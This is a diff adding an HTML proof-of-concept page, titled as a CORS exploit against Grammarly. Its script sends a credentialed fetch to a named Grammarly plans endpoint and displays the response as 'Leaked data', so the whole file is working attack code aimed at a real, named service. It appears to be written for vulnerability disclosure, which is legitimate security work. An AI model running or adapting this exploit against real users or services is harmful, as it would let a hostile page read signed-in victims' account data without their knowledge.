@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>CORS PoC for Grammarly</title>
+</head>
+<body>
+  <h2>Grammarly CORS Exploit PoC</h2>
+  <button onclick="exploit()">Fetch Grammarly Authenticated Data</button>
+  <pre id="output"></pre>
+
+  <script>
+    function exploit() {
+      fetch("https://goldengate.grammarly.com/vito/plans?specialOffers=pro_free_trial&specialOffers=in_product_discount_pro&countryCode=NG", {
+        method: "GET",
+        credentials: "include"
+      })
+      .then(response => {
+        if (!response.ok) {
+          throw new Error("CORS or server error");
+        }
+        return response.json();
+      })
+      .then(data => {
+        console.log("Leaked data:", data);
+        document.getElementById("output").textContent = JSON.stringify(data, null, 2);
+      })
+      .catch(error => {
+        console.error("Blocked by CORS or other error:", error);
+        document.getElementById("output").textContent = "Error: " + error.message;
+      });
+    }
+  </script>
+</body>
+</html>
